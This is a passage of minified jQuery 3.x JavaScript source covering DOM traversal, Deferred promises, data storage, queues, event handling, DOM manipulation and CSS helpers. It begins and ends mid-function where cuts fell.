e=0;e<n;e++)if(w.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,i=this.length,o=[],a="string"!=typeof e&&w(e);if(!D.test(e))for(;r<i;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?a.index(n)>-1:1===n.nodeType&&w.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(o.length>1?w.uniqueSort(o):o)},index:function(e){return e?"string"==typeof e?u.call(w(e),this[0]):u.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(w.uniqueSort(w.merge(this.get(),w(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}});function P(e,t){while((e=e[t])&&1!==e.nodeType);return e}w.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return k(e,"parentNode")},parentsUntil:function(e,t,n){return k(e,"parentNode",n)},next:function(e){return P(e,"nextSibling")},prev:function(e){return P(e,"previousSibling")},nextAll:function(e){return k(e,"nextSibling")},prevAll:function(e){return k(e,"previousSibling")},nextUntil:function(e,t,n){return k(e,"nextSibling",n)},prevUntil:function(e,t,n){return k(e,"previousSibling",n)},siblings:function(e){return S((e.parentNode||{}).firstChild,e)},children:function(e){return S(e.firstChild)},contents:function(e){return N(e,"iframe")?e.contentDocument:(N(e,"template")&&(e=e.content||e),w.merge([],e.childNodes))}},function(e,t){w.fn[e]=function(n,r){var i=w.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=w.filter(r,i)),this.length>1&&(O[e]||w.uniqueSort(i),H.test(e)&&i.reverse()),this.pushStack(i)}});var M=/[^\x20\t\r\n\f]+/g;function R(e){var t={};return w.each(e.match(M)||[],function(e,n){t[n]=!0}),t}w.Callbacks=function(e){e="string"==typeof e?R(e):w.extend({},e);var t,n,r,i,o=[],a=[],s=-1,u=function(){for(i=i||e.once,r=t=!0;a.length;s=-1){n=a.shift();while(++s<o.length)!1===o[s].apply(n[0],n[1])&&e.stopOnFalse&&(s=o.length,n=!1)}e.memory||(n=!1),t=!1,i&&(o=n?[]:"")},l={add:function(){return o&&(n&&!t&&(s=o.length-1,a.push(n)),function t(n){w.each(n,function(n,r){g(r)?e.unique&&l.has(r)||o.push(r):r&&r.length&&"string"!==x(r)&&t(r)})}(arguments),n&&!t&&u()),this},remove:function(){return w.each(arguments,function(e,t){var n;while((n=w.inArray(t,o,n))>-1)o.splice(n,1),n<=s&&s--}),this},has:function(e){return e?w.inArray(e,o)>-1:o.length>0},empty:function(){return o&&(o=[]),this},disable:function(){return i=a=[],o=n="",this},disabled:function(){return!o},lock:function(){return i=a=[],n||t||(o=n=""),this},locked:function(){return!!i},fireWith:function(e,n){return i||(n=[e,(n=n||[]).slice?n.slice():n],a.push(n),t||u()),this},fire:function(){return l.fireWith(this,arguments),this},fired:function(){return!!r}};return l};function I(e){return e}function W(e){throw e}function $(e,t,n,r){var i;try{e&&g(i=e.promise)?i.call(e).done(t).fail(n):e&&g(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}w.extend({Deferred:function(t){var n=[["notify","progress",w.Callbacks("memory"),w.Callbacks("memory"),2],["resolve","done",w.Callbacks("once memory"),w.Callbacks("once memory"),0,"resolved"],["reject","fail",w.Callbacks("once memory"),w.Callbacks("once memory"),1,"rejected"]],r="pending",i={state:function(){return r},always:function(){return o.done(arguments).fail(arguments),this},"catch":function(e){return i.then(null,e)},pipe:function(){var e=arguments;return w.Deferred(function(t){w.each(n,function(n,r){var i=g(e[r[4]])&&e[r[4]];o[r[1]](function(){var e=i&&i.apply(this,arguments);e&&g(e.promise)?e.promise().progress(t.notify).done(t.resolve).fail(t.reject):t[r[0]+"With"](this,i?[e]:arguments)})}),e=null}).promise()},then:function(t,r,i){var o=0;function a(t,n,r,i){return function(){var s=this,u=arguments,l=function(){var e,l;if(!(t<o)){if((e=r.apply(s,u))===n.promise())throw new TypeError("Thenable self-resolution");l=e&&("object"==typeof e||"function"==typeof e)&&e.then,g(l)?i?l.call(e,a(o,n,I,i),a(o,n,W,i)):(o++,l.call(e,a(o,n,I,i),a(o,n,W,i),a(o,n,I,n.notifyWith))):(r!==I&&(s=void 0,u=[e]),(i||n.resolveWith)(s,u))}},c=i?l:function(){try{l()}catch(e){w.Deferred.exceptionHook&&w.Deferred.exceptionHook(e,c.stackTrace),t+1>=o&&(r!==W&&(s=void 0,u=[e]),n.rejectWith(s,u))}};t?c():(w.Deferred.getStackHook&&(c.stackTrace=w.Deferred.getStackHook()),e.setTimeout(c))}}return w.Deferred(function(e){n[0][3].add(a(0,e,g(i)?i:I,e.notifyWith)),n[1][3].add(a(0,e,g(t)?t:I)),n[2][3].add(a(0,e,g(r)?r:W))}).promise()},promise:function(e){return null!=e?w.extend(e,i):i}},o={};return w.each(n,function(e,t){var a=t[2],s=t[5];i[t[1]]=a.add,s&&a.add(function(){r=s},n[3-e][2].disable,n[3-e][3].disable,n[0][2].lock,n[0][3].lock),a.add(t[3].fire),o[t[0]]=function(){return o[t[0]+"With"](this===o?void 0:this,arguments),this},o[t[0]+"With"]=a.fireWith}),i.promise(o),t&&t.call(o,o),o},when:function(e){var t=arguments.length,n=t,r=Array(n),i=o.call(arguments),a=w.Deferred(),s=function(e){return function(n){r[e]=this,i[e]=arguments.length>1?o.call(arguments):n,--t||a.resolveWith(r,i)}};if(t<=1&&($(e,a.done(s(n)).resolve,a.reject,!t),"pending"===a.state()||g(i[n]&&i[n].then)))return a.then();while(n--)$(i[n],s(n),a.reject);return a.promise()}});var B=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;w.Deferred.exceptionHook=function(t,n){e.console&&e.console.warn&&t&&B.test(t.name)&&e.console.warn("jQuery.Deferred exception: "+t.message,t.stack,n)},w.readyException=function(t){e.setTimeout(function(){throw t})};var F=w.Deferred();w.fn.ready=function(e){return F.then(e)["catch"](function(e){w.readyException(e)}),this},w.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--w.readyWait:w.isReady)||(w.isReady=!0,!0!==e&&--w.readyWait>0||F.resolveWith(r,[w]))}}),w.ready.then=F.then;function _(){r.removeEventListener("DOMContentLoaded",_),e.removeEventListener("load",_),w.ready()}"complete"===r.readyState||"loading"!==r.readyState&&!r.documentElement.doScroll?e.setTimeout(w.ready):(r.addEventListener("DOMContentLoaded",_),e.addEventListener("load",_));var z=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if("object"===x(n)){i=!0;for(s in n)z(e,t,s,n[s],!0,o,a)}else if(void 0!==r&&(i=!0,g(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(w(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return i?e:l?t.call(e):u?t(e[0],n):o},X=/^-ms-/,U=/-([a-z])/g;function V(e,t){return t.toUpperCase()}function G(e){return e.replace(X,"ms-").replace(U,V)}var Y=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function Q(){this.expando=w.expando+Q.uid++}Q.uid=1,Q.prototype={cache:function(e){var t=e[this.expando];return t||(t={},Y(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,i=this.cache(e);if("string"==typeof t)i[G(t)]=n;else for(r in t)i[G(r)]=t[r];return i},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][G(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){n=(t=Array.isArray(t)?t.map(G):(t=G(t))in r?[t]:t.match(M)||[]).length;while(n--)delete r[t[n]]}(void 0===t||w.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!w.isEmptyObject(t)}};var J=new Q,K=new Q,Z=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,ee=/[A-Z]/g;function te(e){return"true"===e||"false"!==e&&("null"===e?null:e===+e+""?+e:Z.test(e)?JSON.parse(e):e)}function ne(e,t,n){var r;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(ee,"-$&").toLowerCase(),"string"==typeof(n=e.getAttribute(r))){try{n=te(n)}catch(e){}K.set(e,t,n)}else n=void 0;return n}w.extend({hasData:function(e){return K.hasData(e)||J.hasData(e)},data:function(e,t,n){return K.access(e,t,n)},removeData:function(e,t){K.remove(e,t)},_data:function(e,t,n){return J.access(e,t,n)},_removeData:function(e,t){J.remove(e,t)}}),w.fn.extend({data:function(e,t){var n,r,i,o=this[0],a=o&&o.attributes;if(void 0===e){if(this.length&&(i=K.get(o),1===o.nodeType&&!J.get(o,"hasDataAttrs"))){n=a.length;while(n--)a[n]&&0===(r=a[n].name).indexOf("data-")&&(r=G(r.slice(5)),ne(o,r,i[r]));J.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof e?this.each(function(){K.set(this,e)}):z(this,function(t){var n;if(o&&void 0===t){if(void 0!==(n=K.get(o,e)))return n;if(void 0!==(n=ne(o,e)))return n}else this.each(function(){K.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){K.remove(this,e)})}}),w.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=J.get(e,t),n&&(!r||Array.isArray(n)?r=J.access(e,t,w.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=w.queue(e,t),r=n.length,i=n.shift(),o=w._queueHooks(e,t),a=function(){w.dequeue(e,t)};"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,a,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return J.get(e,n)||J.access(e,n,{empty:w.Callbacks("once memory").add(function(){J.remove(e,[t+"queue",n])})})}}),w.fn.extend({queue:function(e,t){var n=2;return"string"!=typeof e&&(t=e,e="fx",n--),arguments.length<n?w.queue(this[0],e):void 0===t?this:this.each(function(){var n=w.queue(this,e,t);w._queueHooks(this,e),"fx"===e&&"inprogress"!==n[0]&&w.dequeue(this,e)})},dequeue:function(e){return this.each(function(){w.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=w.Deferred(),o=this,a=this.length,s=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=void 0),e=e||"fx";while(a--)(n=J.get(o[a],e+"queueHooks"))&&n.empty&&(r++,n.empty.add(s));return s(),i.promise(t)}});var re=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,ie=new RegExp("^(?:([+-])=|)("+re+")([a-z%]*)$","i"),oe=["Top","Right","Bottom","Left"],ae=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&w.contains(e.ownerDocument,e)&&"none"===w.css(e,"display")},se=function(e,t,n,r){var i,o,a={};for(o in t)a[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=a[o];return i};function ue(e,t,n,r){var i,o,a=20,s=r?function(){return r.cur()}:function(){return w.css(e,t,"")},u=s(),l=n&&n[3]||(w.cssNumber[t]?"":"px"),c=(w.cssNumber[t]||"px"!==l&&+u)&&ie.exec(w.css(e,t));if(c&&c[3]!==l){u/=2,l=l||c[3],c=+u||1;while(a--)w.style(e,t,c+l),(1-o)*(1-(o=s()/u||.5))<=0&&(a=0),c/=o;c*=2,w.style(e,t,c+l),n=n||[]}return n&&(c=+c||+u||0,i=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=i)),i}var le={};function ce(e){var t,n=e.ownerDocument,r=e.nodeName,i=le[r];return i||(t=n.body.appendChild(n.createElement(r)),i=w.css(t,"display"),t.parentNode.removeChild(t),"none"===i&&(i="block"),le[r]=i,i)}function fe(e,t){for(var n,r,i=[],o=0,a=e.length;o<a;o++)(r=e[o]).style&&(n=r.style.display,t?("none"===n&&(i[o]=J.get(r,"display")||null,i[o]||(r.style.display="")),""===r.style.display&&ae(r)&&(i[o]=ce(r))):"none"!==n&&(i[o]="none",J.set(r,"display",n)));for(o=0;o<a;o++)null!=i[o]&&(e[o].style.display=i[o]);return e}w.fn.extend({show:function(){return fe(this,!0)},hide:function(){return fe(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){ae(this)?w(this).show():w(this).hide()})}});var pe=/^(?:checkbox|radio)$/i,de=/<([a-z][^\/\0>\x20\t\r\n\f]+)/i,he=/^$|^module$|\/(?:java|ecma)script/i,ge={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};ge.optgroup=ge.option,ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td;function ye(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&N(e,t)?w.merge([e],n):n}function ve(e,t){for(var n=0,r=e.length;n<r;n++)J.set(e[n],"globalEval",!t||J.get(t[n],"globalEval"))}var me=/<|&#?\w+;/;function xe(e,t,n,r,i){for(var o,a,s,u,l,c,f=t.createDocumentFragment(),p=[],d=0,h=e.length;d<h;d++)if((o=e[d])||0===o)if("object"===x(o))w.merge(p,o.nodeType?[o]:o);else if(me.test(o)){a=a||f.appendChild(t.createElement("div")),s=(de.exec(o)||["",""])[1].toLowerCase(),u=ge[s]||ge._default,a.innerHTML=u[1]+w.htmlPrefilter(o)+u[2],c=u[0];while(c--)a=a.lastChild;w.merge(p,a.childNodes),(a=f.firstChild).textContent=""}else p.push(t.createTextNode(o));f.textContent="",d=0;while(o=p[d++])if(r&&w.inArray(o,r)>-1)i&&i.push(o);else if(l=w.contains(o.ownerDocument,o),a=ye(f.appendChild(o),"script"),l&&ve(a),n){c=0;while(o=a[c++])he.test(o.type||"")&&n.push(o)}return f}!function(){var e=r.createDocumentFragment().appendChild(r.createElement("div")),t=r.createElement("input");t.setAttribute("type","radio"),t.setAttribute("checked","checked"),t.setAttribute("name","t"),e.appendChild(t),h.checkClone=e.cloneNode(!0).cloneNode(!0).lastChild.checked,e.innerHTML="<textarea>x</textarea>",h.noCloneChecked=!!e.cloneNode(!0).lastChild.defaultValue}();var be=r.documentElement,we=/^key/,Te=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,Ce=/^([^.]*)(?:\.(.+)|)/;function Ee(){return!0}function ke(){return!1}function Se(){try{return r.activeElement}catch(e){}}function De(e,t,n,r,i,o){var a,s;if("object"==typeof t){"string"!=typeof n&&(r=r||n,n=void 0);for(s in t)De(e,s,n,r,t[s],o);return e}if(null==r&&null==i?(i=n,r=n=void 0):null==i&&("string"==typeof n?(i=r,r=void 0):(i=r,r=n,n=void 0)),!1===i)i=ke;else if(!i)return e;return 1===o&&(a=i,(i=function(e){return w().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=w.guid++)),e.each(function(){w.event.add(this,t,i,r,n)})}w.event={global:{},add:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,y=J.get(e);if(y){n.handler&&(n=(o=n).handler,i=o.selector),i&&w.find.matchesSelector(be,i),n.guid||(n.guid=w.guid++),(u=y.events)||(u=y.events={}),(a=y.handle)||(a=y.handle=function(t){return"undefined"!=typeof w&&w.event.triggered!==t.type?w.event.dispatch.apply(e,arguments):void 0}),l=(t=(t||"").match(M)||[""]).length;while(l--)d=g=(s=Ce.exec(t[l])||[])[1],h=(s[2]||"").split(".").sort(),d&&(f=w.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=w.event.special[d]||{},c=w.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&w.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||((p=u[d]=[]).delegateCount=0,f.setup&&!1!==f.setup.call(e,r,h,a)||e.addEventListener&&e.addEventListener(d,a)),f.add&&(f.add.call(e,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),w.event.global[d]=!0)}},remove:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,y=J.hasData(e)&&J.get(e);if(y&&(u=y.events)){l=(t=(t||"").match(M)||[""]).length;while(l--)if(s=Ce.exec(t[l])||[],d=g=s[1],h=(s[2]||"").split(".").sort(),d){f=w.event.special[d]||{},p=u[d=(r?f.delegateType:f.bindType)||d]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=o=p.length;while(o--)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));a&&!p.length&&(f.teardown&&!1!==f.teardown.call(e,h,y.handle)||w.removeEvent(e,d,y.handle),delete u[d])}else for(d in u)w.event.remove(e,d+t[l],n,r,!0);w.isEmptyObject(u)&&J.remove(e,"handle events")}},dispatch:function(e){var t=w.event.fix(e),n,r,i,o,a,s,u=new Array(arguments.length),l=(J.get(this,"events")||{})[t.type]||[],c=w.event.special[t.type]||{};for(u[0]=t,n=1;n<arguments.length;n++)u[n]=arguments[n];if(t.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,t)){s=w.event.handlers.call(this,t,l),n=0;while((o=s[n++])&&!t.isPropagationStopped()){t.currentTarget=o.elem,r=0;while((a=o.handlers[r++])&&!t.isImmediatePropagationStopped())t.rnamespace&&!t.rnamespace.test(a.namespace)||(t.handleObj=a,t.data=a.data,void 0!==(i=((w.event.special[a.origType]||{}).handle||a.handler).apply(o.elem,u))&&!1===(t.result=i)&&(t.preventDefault(),t.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,t),t.result}},handlers:function(e,t){var n,r,i,o,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&e.button>=1))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(o=[],a={},n=0;n<u;n++)void 0===a[i=(r=t[n]).selector+" "]&&(a[i]=r.needsContext?w(i,this).index(l)>-1:w.find(i,this,null,[l]).length),a[i]&&o.push(r);o.length&&s.push({elem:l,handlers:o})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(e,t){Object.defineProperty(w.Event.prototype,e,{enumerable:!0,configurable:!0,get:g(t)?function(){if(this.originalEvent)return t(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[e]},set:function(t){Object.defineProperty(this,e,{enumerable:!0,configurable:!0,writable:!0,value:t})}})},fix:function(e){return e[w.expando]?e:new w.Event(e)},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==Se()&&this.focus)return this.focus(),!1},delegateType:"focusin"},blur:{trigger:function(){if(this===Se()&&this.blur)return this.blur(),!1},delegateType:"focusout"},click:{trigger:function(){if("checkbox"===this.type&&this.click&&N(this,"input"))return this.click(),!1},_default:function(e){return N(e.target,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},w.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},w.Event=function(e,t){if(!(this instanceof w.Event))return new w.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?Ee:ke,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&w.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[w.expando]=!0},w.Event.prototype={constructor:w.Event,isDefaultPrevented:ke,isPropagationStopped:ke,isImmediatePropagationStopped:ke,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=Ee,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=Ee,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=Ee,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},w.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,"char":!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&we.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&Te.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},w.event.addProp),w.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,t){w.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return i&&(i===r||w.contains(r,i))||(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),w.fn.extend({on:function(e,t,n,r){return De(this,e,t,n,r)},one:function(e,t,n,r){return De(this,e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,w(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=ke),this.each(function(){w.event.remove(this,e,n,t)})}});var Ne=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,Ae=/<script|<style|<link/i,je=/checked\s*(?:[^=]|=\s*.checked.)/i,qe=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function Le(e,t){return N(e,"table")&&N(11!==t.nodeType?t:t.firstChild,"tr")?w(e).children("tbody")[0]||e:e}function He(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function Oe(e){return"true/"===(e.type||"").slice(0,5)?e.type=e.type.slice(5):e.removeAttribute("type"),e}function Pe(e,t){var n,r,i,o,a,s,u,l;if(1===t.nodeType){if(J.hasData(e)&&(o=J.access(e),a=J.set(t,o),l=o.events)){delete a.handle,a.events={};for(i in l)for(n=0,r=l[i].length;n<r;n++)w.event.add(t,i,l[i][n])}K.hasData(e)&&(s=K.access(e),u=w.extend({},s),K.set(t,u))}}function Me(e,t){var n=t.nodeName.toLowerCase();"input"===n&&pe.test(e.type)?t.checked=e.checked:"input"!==n&&"textarea"!==n||(t.defaultValue=e.defaultValue)}function Re(e,t,n,r){t=a.apply([],t);var i,o,s,u,l,c,f=0,p=e.length,d=p-1,y=t[0],v=g(y);if(v||p>1&&"string"==typeof y&&!h.checkClone&&je.test(y))return e.each(function(i){var o=e.eq(i);v&&(t[0]=y.call(this,i,o.html())),Re(o,t,n,r)});if(p&&(i=xe(t,e[0].ownerDocument,!1,e,r),o=i.firstChild,1===i.childNodes.length&&(i=o),o||r)){for(u=(s=w.map(ye(i,"script"),He)).length;f<p;f++)l=i,f!==d&&(l=w.clone(l,!0,!0),u&&w.merge(s,ye(l,"script"))),n.call(e[f],l,f);if(u)for(c=s[s.length-1].ownerDocument,w.map(s,Oe),f=0;f<u;f++)l=s[f],he.test(l.type||"")&&!J.access(l,"globalEval")&&w.contains(c,l)&&(l.src&&"module"!==(l.type||"").toLowerCase()?w._evalUrl&&w._evalUrl(l.src):m(l.textContent.replace(qe,""),c,l))}return e}function Ie(e,t,n){for(var r,i=t?w.filter(t,e):e,o=0;null!=(r=i[o]);o++)n||1!==r.nodeType||w.cleanData(ye(r)),r.parentNode&&(n&&w.contains(r.ownerDocument,r)&&ve(ye(r,"script")),r.parentNode.removeChild(r));return e}w.extend({htmlPrefilter:function(e){return e.replace(Ne,"<$1></$2>")},clone:function(e,t,n){var r,i,o,a,s=e.cloneNode(!0),u=w.contains(e.ownerDocument,e);if(!(h.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||w.isXMLDoc(e)))for(a=ye(s),r=0,i=(o=ye(e)).length;r<i;r++)Me(o[r],a[r]);if(t)if(n)for(o=o||ye(e),a=a||ye(s),r=0,i=o.length;r<i;r++)Pe(o[r],a[r]);else Pe(e,s);return(a=ye(s,"script")).length>0&&ve(a,!u&&ye(e,"script")),s},cleanData:function(e){for(var t,n,r,i=w.event.special,o=0;void 0!==(n=e[o]);o++)if(Y(n)){if(t=n[J.expando]){if(t.events)for(r in t.events)i[r]?w.event.remove(n,r):w.removeEvent(n,r,t.handle);n[J.expando]=void 0}n[K.expando]&&(n[K.expando]=void 0)}}}),w.fn.extend({detach:function(e){return Ie(this,e,!0)},remove:function(e){return Ie(this,e)},text:function(e){return z(this,function(e){return void 0===e?w.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return Re(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||Le(this,e).appendChild(e)})},prepend:function(){return Re(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Le(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return Re(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return Re(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(w.cleanData(ye(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return w.clone(this,e,t)})},html:function(e){return z(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!Ae.test(e)&&!ge[(de.exec(e)||["",""])[1].toLowerCase()]){e=w.htmlPrefilter(e);try{for(;n<r;n++)1===(t=this[n]||{}).nodeType&&(w.cleanData(ye(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=[];return Re(this,arguments,function(t){var n=this.parentNode;w.inArray(this,e)<0&&(w.cleanData(ye(this)),n&&n.replaceChild(t,this))},e)}}),w.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){w.fn[e]=function(e){for(var n,r=[],i=w(e),o=i.length-1,a=0;a<=o;a++)n=a===o?this:this.clone(!0),w(i[a])[t](n),s.apply(r,n.get());return this.pushStack(r)}});var We=new RegExp("^("+re+")(?!px)[a-z%]+$","i"),$e=function(t){var n=t.ownerDocument.defaultView;return n&&n.opener||(n=e),n.getComputedStyle(t)},Be=new RegExp(oe.join("|"),"i");!function(){function t(){if(c){l.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",c.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",be.appendChild(l).appendChild(c);var t=e.getComputedStyle(c);i="1%"!==t.top,u=12===n(t.marginLeft),c.style.right="60%",s=36===n(t.right),o=36===n(t.width),c.style.position="absolute",a=36===c.offsetWidth||"absolute",be.removeChild(l),c=null}}function n(e){return Math.round(parseFloat(e))}var i,o,a,s,u,l=r.createElement("div"),c=r.createElement("div");c.style&&(c.style.backgroundClip="content-box",c.cloneNode(!0).style.backgroundClip="",h.clearCloneStyle="content-box"===c.style.backgroundClip,w.extend(h,{boxSizingReliable:function(){return t(),o},pixelBoxStyles:function(){return t(),s},pixelPosition:function(){return t(),i},reliableMarginLeft:function(){return t(),u},scrollboxSize:function(){return t(),a}}))}();function Fe(e,t,n){var r,i,o,a,s=e.style;return(n=n||$e(e))&&(""!==(a=n.getPropertyValue(t)||n[t])||w.contains(e.ownerDocument,e)||(a=w.style(e,t)),!h.pixelBoxStyles()&&We.test(a)&&Be.test(t)&&(r=s.width,i=s.minWidth,o=s.maxWidth,s.minWidth=s.maxWidth=s.width=a,a=n.width,s.width=r,s.minWidth=i,s.maxWidth=o)),void 0!==a?a+"":a}function _e(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}var ze=/^(none|table(?!-c[ea]).+)/,Xe=/^--/,Ue={position:"absolute",visibility:"hidden",display:"block"},Ve={letterSpacing:"0",fontWeight:"400"},Ge=["Webkit","Moz","ms"],Ye=r.createElement("div").style;function Qe(e){if(e in Ye)return e;var t=e[0].toUpperCase()+e.slice(1),n=Ge.length;while(n--)if((e=Ge[n]+t)in Ye)return e}function Je(e){var t=w.cssProps[e];return t||(t=w.cssProps[e]=Qe(e)||e),t}function Ke(e,t,n){var r=ie.exec(t);return r?Math.max(0,r[2]-(n||0))+(r[3]||"px"):t}function Ze(e,t,n,r,i,o){var a="width"===t?1:0,s=0,u=0;if(n===(r?"border":"content"))return 